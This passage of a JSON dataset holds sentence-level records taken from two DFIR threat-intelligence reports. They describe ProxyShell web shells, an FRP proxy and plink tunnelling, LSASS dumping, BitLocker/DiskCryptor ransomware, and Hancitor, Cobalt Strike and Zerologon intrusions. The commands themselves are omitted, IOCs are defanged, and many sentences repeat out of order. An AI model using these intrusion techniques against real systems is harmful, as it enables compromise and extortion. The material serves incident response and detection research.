        "line": 44,
        "index": 5751
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S45",
        "text": "Running file command on these two web shells, show that they are actually PST files that contain web shell:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 45,
        "index": 5752
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S46",
        "text": "The first web shell, aspx_qdajscizfzx.apsx, can upload files and runs cmd.exe:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 46,
        "index": 5753
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S47",
        "text": "The second web shell, aspx_gtonvbgidhh.apsx, can upload files and runs powershell.exe:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 47,
        "index": 5754
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S48",
        "text": "The threat actors executed a script named install-proxy.bat, containing the following lines of code:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 48,
        "index": 5755
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S49",
        "text": "The script creates two directories, then moves files into their respective directories.",
        "type": "",
        "report": "r-dfir-20",
        "line": 49,
        "index": 5756
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S50",
        "text": "It first stops and then deletes a task named CacheTask if it exists.",
        "type": "",
        "report": "r-dfir-20",
        "line": 50,
        "index": 5757
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S51",
        "text": "It then Creates a schedule task which will call an XML file which then executes CacheTask.bat\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 51,
        "index": 5758
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S52",
        "text": "CacheTask.bat is a script that loops the execution of the Fast Reverse Proxy (FRP) binary:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 52,
        "index": 5759
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S53",
        "text": "Below is a screenshot of dllhost.exe hash lookup in VirusTotal, matching Florian Roth\u2019s Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 53,
        "index": 5760
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S54",
        "text": "The C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 54,
        "index": 5761
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S55",
        "text": "The above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 55,
        "index": 5762
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S56",
        "text": "The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 56,
        "index": 5763
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S57",
        "text": "In the command line above you can see several options being used:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 57,
        "index": 5764
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S58",
        "text": "After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 58,
        "index": 5765
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S59",
        "text": "To maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount.",
        "type": "",
        "report": "r-dfir-20",
        "line": 59,
        "index": 5766
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S60",
        "text": "It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic.",
        "type": "",
        "report": "r-dfir-20",
        "line": 60,
        "index": 5767
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S61",
        "text": "The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (Reference).\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 61,
        "index": 5768
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S62",
        "text": "To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 62,
        "index": 5769
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S63",
        "text": "After activating the account, the threat actors set the password of this account to [email protected] and added it to Administrators and Remote Desktop Users groups.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 63,
        "index": 5770
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S64",
        "text": "ProxyShell exploitation provided the threat actors with NT AUTHORITY\\SYSTEM privileges.",
        "type": "",
        "report": "r-dfir-20",
        "line": 64,
        "index": 5771
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S65",
        "text": "Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials.",
        "type": "",
        "report": "r-dfir-20",
        "line": 65,
        "index": 5772
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S66",
        "text": "Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.",
        "type": "",
        "report": "r-dfir-20",
        "line": 66,
        "index": 5773
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S67",
        "text": "Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion.",
        "type": "",
        "report": "r-dfir-20",
        "line": 67,
        "index": 5774
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S68",
        "text": "However, the threat actors performed masquerading with many of their tools:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 68,
        "index": 5775
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S69",
        "text": "They created login.aspx web shell in the same folder as the legitimate OWA login page.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 69,
        "index": 5776
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S70",
        "text": "They renamed Fast Reverse Proxy to dllhost.exe to remain stealthy\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 70,
        "index": 5777
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S71",
        "text": "They created the Scheduled Task with \u201c\\Microsoft\\Windows\\Maintenance\\CacheTask\u201d name to stay un-noticed\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 71,
        "index": 5778
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S72",
        "text": "The threat actors dumped LSASS process manually using the Task Manager CAR-2019-08-001:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 72,
        "index": 5779
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S73",
        "text": "To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 73,
        "index": 5780
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S74",
        "text": "As previously mentioned, we saw multiple cmdlets related to exchange:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 74,
        "index": 5781
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S75",
        "text": "Using the dropped web shells, the threat actors performed the following commands:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 75,
        "index": 5782
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S76",
        "text": "The threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 76,
        "index": 5783
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S77",
        "text": "The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account.",
        "type": "",
        "report": "r-dfir-20",
        "line": 77,
        "index": 5784
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S78",
        "text": "Below is an extract focusing on RDP activity from patient 0:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 78,
        "index": 5785
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S79",
        "text": "The threat actors also appeared to use Impacket\u2019s wmiexec to perform lateral movement on one of the domain controllers.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 79,
        "index": 5786
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S80",
        "text": "We do not have a clear explanation for that behavior.",
        "type": "",
        "report": "r-dfir-20",
        "line": 80,
        "index": 5787
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S81",
        "text": "However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 81,
        "index": 5788
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S82",
        "text": "No data collection was observed in this intrusion.",
        "type": "",
        "report": "r-dfir-20",
        "line": 82,
        "index": 5789
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S83",
        "text": "The threat actors only collected the dumped LSASS using a zip archive:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 83,
        "index": 5790
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S84",
        "text": "No Command and Control frameworks were used during this intrusion.",
        "type": "",
        "report": "r-dfir-20",
        "line": 84,
        "index": 5791
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S85",
        "text": "Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 85,
        "index": 5792
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S86",
        "text": "Threat actors created a SSH tunnel to 148.251.71[.]182 using plink in order to forward RDP access:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 86,
        "index": 5793
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S87",
        "text": "Looking at this IP address on VirusTotal, we can observe that all \u201cCommunicating Files\u201d related to it trigger FRP AV Signatures or Yara rules:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 87,
        "index": 5794
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S88",
        "text": "We can conclude that those threat actors are used to this protocol tunneling technique.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 88,
        "index": 5795
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S89",
        "text": "Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 89,
        "index": 5796
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S90",
        "text": "In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide.",
        "type": "",
        "report": "r-dfir-20",
        "line": 90,
        "index": 5797
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S91",
        "text": "On servers a batch script named setup.bat was used and on workstations the GUI application named dcrypt.exe(DiskCryptor) was executed instead.",
        "type": "",
        "report": "r-dfir-20",
        "line": 91,
        "index": 5798
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S92",
        "text": "Both were executed via the threat actors after RDP login to each host.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 92,
        "index": 5799
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S93",
        "text": "On servers they copied over a file named setup.bat.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 93,
        "index": 5800
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S94",
        "text": "They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.",
        "type": "",
        "report": "r-dfir-20",
        "line": 94,
        "index": 5801
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S95",
        "text": "Below are the commands executed by the script:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 95,
        "index": 5802
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S96",
        "text": "Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 96,
        "index": 5803
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S97",
        "text": "A binary called dcrypt.exe, was dropped on a backup server and immediately deleted.",
        "type": "",
        "report": "r-dfir-20",
        "line": 97,
        "index": 5804
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S98",
        "text": "While this utility was not executed on any servers in the environment it was deployed to all the workstations.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 98,
        "index": 5805
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S99",
        "text": "The executable used is the current release of the installer for the utility DiskCryptor.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 99,
        "index": 5806
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S100",
        "text": "We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 100,
        "index": 5807
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S101",
        "text": "Use of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 101,
        "index": 5808
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S102",
        "text": "This executable, however, reminds you on install that it is \u201cbeta\u201d software.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 102,
        "index": 5809
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S103",
        "text": "The setup process then works as most windows installers and requires a reboot of the system.",
        "type": "",
        "report": "r-dfir-20",
        "line": 103,
        "index": 5810
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S104",
        "text": "During installation a kernel mode driver is added to support the encryption process.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 104,
        "index": 5811
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S105",
        "text": "After reboot, the program GUI allows you to configure the encryption options.\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 105,
        "index": 5812
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S106",
        "text": "After encryption completed, the systems were rebooted and left with the following screen: The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out.",
        "type": "",
        "report": "r-dfir-20",
        "line": 106,
        "index": 5813
    },
    {
        "id": "dfir-reports-filtered/r-dfir-20.md:::S107",
        "text": "The note pointed to Telegram and ProtonMail contacts\n",
        "type": "",
        "report": "r-dfir-20",
        "line": 107,
        "index": 5814
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S0",
        "text": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
        "type": "",
        "report": "r-dfir-21",
        "line": 0,
        "index": 5815
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S1",
        "text": "The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 1,
        "index": 5816
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S2",
        "text": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "type": "",
        "report": "r-dfir-21",
        "line": 2,
        "index": 5817
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S3",
        "text": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 3,
        "index": 5818
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S4",
        "text": "After that, a battery of Windows utilities were run to check the windows domain trusts, domain administrators, domain controllers, and test connectivity.",
        "type": "",
        "report": "r-dfir-21",
        "line": 4,
        "index": 5819
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S5",
        "text": "They then checked access to remote systems by connecting to the C$ share.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 5,
        "index": 5820
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S6",
        "text": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "type": "",
        "report": "r-dfir-21",
        "line": 6,
        "index": 5821
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S7",
        "text": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "type": "",
        "report": "r-dfir-21",
        "line": 7,
        "index": 5822
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S8",
        "text": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "type": "",
        "report": "r-dfir-21",
        "line": 8,
        "index": 5823
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S9",
        "text": "The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.",
        "type": "",
        "report": "r-dfir-21",
        "line": 9,
        "index": 5824
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S10",
        "text": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "type": "",
        "report": "r-dfir-21",
        "line": 10,
        "index": 5825
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S11",
        "text": "The domain controllers were vulnerable, and as a result, the operators managed to dump the domain administrator\u2019s NTLM hash.",
        "type": "",
        "report": "r-dfir-21",
        "line": 11,
        "index": 5826
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S12",
        "text": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 12,
        "index": 5827
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S13",
        "text": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "type": "",
        "report": "r-dfir-21",
        "line": 13,
        "index": 5828
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S14",
        "text": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "type": "",
        "report": "r-dfir-21",
        "line": 14,
        "index": 5829
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S15",
        "text": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
        "type": "",
        "report": "r-dfir-21",
        "line": 15,
        "index": 5830
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S16",
        "text": "Similar to a previous case, the threat actors were evicted before completing their mission and as a result their final actions could not be observed.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 16,
        "index": 5831
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S17",
        "text": "Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 17,
        "index": 5832
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S18",
        "text": "The document was delivered via an email that included a link to Google\u2019s Feed Proxy service which was hosting a malicious document as shared by @James_inthe_box .",
        "type": "",
        "report": "r-dfir-21",
        "line": 18,
        "index": 5833
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S19",
        "text": "Thanks for sharing James!\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 19,
        "index": 5834
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S20",
        "text": "Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 20,
        "index": 5835
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S21",
        "text": "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 21,
        "index": 5836
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S22",
        "text": "The Cobalt Strike servers in this case were added to the Threat Feed on 5/16 and 7/15 .\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 22,
        "index": 5837
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S23",
        "text": "We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc.",
        "type": "",
        "report": "r-dfir-21",
        "line": 23,
        "index": 5838
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S24",
        "text": "More information on this service and others can be found here .\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 24,
        "index": 5839
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S25",
        "text": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
        "type": "",
        "report": "r-dfir-21",
        "line": 25,
        "index": 5840
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S26",
        "text": "Similar to a previous case , the threat actors were evicted before completing their mission and as a result their final actions could not be observed.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 26,
        "index": 5841
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S27",
        "text": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
        "type": "",
        "report": "r-dfir-21",
        "line": 27,
        "index": 5842
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S28",
        "text": "Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.",
        "type": "",
        "report": "r-dfir-21",
        "line": 28,
        "index": 5843
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S29",
        "text": "Next, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers.",
        "type": "",
        "report": "r-dfir-21",
        "line": 29,
        "index": 5844
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S30",
        "text": "The domain controllers were vulnerable, and as a result, the operators managed to dump the domain administrator\u2019s NTLM hash.",
        "type": "",
        "report": "r-dfir-21",
        "line": 30,
        "index": 5845
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S31",
        "text": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 31,
        "index": 5846
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S32",
        "text": "The threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user.",
        "type": "",
        "report": "r-dfir-21",
        "line": 32,
        "index": 5847
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S33",
        "text": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
        "type": "",
        "report": "r-dfir-21",
        "line": 33,
        "index": 5848
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S34",
        "text": "Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access.",
        "type": "",
        "report": "r-dfir-21",
        "line": 34,
        "index": 5849
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S35",
        "text": "The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.",
        "type": "",
        "report": "r-dfir-21",
        "line": 35,
        "index": 5850
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S36",
        "text": "After that, a battery of Windows utilities were run to check the windows domain trusts, domain administrators, domain controllers, and test connectivity.",
        "type": "",
        "report": "r-dfir-21",
        "line": 36,
        "index": 5851
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S37",
        "text": "They then checked access to remote systems by connecting to the C$ share.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 37,
        "index": 5852
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S38",
        "text": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
        "type": "",
        "report": "r-dfir-21",
        "line": 38,
        "index": 5853
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S39",
        "text": "The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam and Backup Exec.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 39,
        "index": 5854
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S40",
        "text": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
        "type": "",
        "report": "r-dfir-21",
        "line": 40,
        "index": 5855
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S41",
        "text": "The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 41,
        "index": 5856
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S42",
        "text": "Various different enumeration and lateral movement tactics were observed on the network, along with the exploitation of Zerologon to elevate to domain administrator and gain full control over the domain.",
        "type": "",
        "report": "r-dfir-21",
        "line": 42,
        "index": 5857
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S43",
        "text": "The threat actor was able to go from zero access to domain admin, in just under one hour.",
        "type": "",
        "report": "r-dfir-21",
        "line": 43,
        "index": 5858
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S44",
        "text": "This report will go through an intrusion from July that began with an email, which included a link to Google\u2019s Feed Proxy service that was used to download a malicious Word document.",
        "type": "",
        "report": "r-dfir-21",
        "line": 44,
        "index": 5859
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S45",
        "text": "Upon the user enabling macros, a Hancitor dll was executed, which called the usual suspect, Cobalt Strike.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 45,
        "index": 5860
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S46",
        "text": "Reviewing the document we can see the expected malicious macro and identify the location of a dll to be dropped in the:\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 46,
        "index": 5861
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S47",
        "text": "We can see that this relates to the path:\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 47,
        "index": 5862
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S48",
        "text": "And once the dll \u201cier\u201d is written there, the macro proceeds to execute it.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 48,
        "index": 5863
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S49",
        "text": "Three files were downloaded by Hancitor from 4a5ikol[.]ru (8.211.241.0) including two Cobalt Strike stagers and Ficker Stealer.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 49,
        "index": 5864
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S50",
        "text": "Hancitor then launched multiple instances of svchost.exe and process injected them with Cobalt Strike.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 50,
        "index": 5865
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S51",
        "text": "The following diagram shows the initial execution process from the WINWORD.exe to the Cobalt Strike Beacons that were injected into memory by Hancitor.",
        "type": "",
        "report": "r-dfir-21",
        "line": 51,
        "index": 5866
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S52",
        "text": "Lastly, a Cobalt Strike command and control server was pinged before they copied the Cobalt Strike DLL and batch file, which were used to facilitate lateral movement.",
        "type": "",
        "report": "r-dfir-21",
        "line": 52,
        "index": 5867
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S53",
        "text": "The batch file (cor.bat) is a 3-line script that will execute the Cobalt Strike DLL using rundll32.exe with a specific parameter.",
        "type": "",
        "report": "r-dfir-21",
        "line": 53,
        "index": 5868
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S54",
        "text": "The Cobalt Strike DLL used in this case resembles the same Cobalt Strike DLL seen in case 4301 based on the YARA rule associated to that case, indicating likely links between the actors in the two cases.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 54,
        "index": 5869
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S55",
        "text": "The threat actor made use of a custom developed implementation of Zerologon (CVE-2020-1472) executed from a file named \u201czero.exe\u201d.",
        "type": "",
        "report": "r-dfir-21",
        "line": 55,
        "index": 5870
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S56",
        "text": "Once \u201czero.exe\u201d is run it will provide the threat actor with the NTLM hash of the specified username, a Domain Administrator account in this case.",
        "type": "",
        "report": "r-dfir-21",
        "line": 56,
        "index": 5871
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S57",
        "text": "On the Domain Controller a service (Event ID 7045) will be created that will run the Reset-ComputerMachinePassword PowerShell Cmdlet.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 57,
        "index": 5872
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S58",
        "text": "The service will then be executed and the machine account password will be reset.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 58,
        "index": 5873
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S59",
        "text": "Zerologon will create an Event ID 4624 for the domain controller computer account attempting to authenticate.",
        "type": "",
        "report": "r-dfir-21",
        "line": 59,
        "index": 5874
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S60",
        "text": "The main red flag is the source network address IP differing from the IP of the domain controller, which in this case is set to the beachhead workstation on which zero.exe was executed.",
        "type": "",
        "report": "r-dfir-21",
        "line": 60,
        "index": 5875
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S61",
        "text": "Lastly, Event ID 4648 will be logged on the beachhead machine indicating the zero.exe process was used to connect to a domain controller.",
        "type": "",
        "report": "r-dfir-21",
        "line": 61,
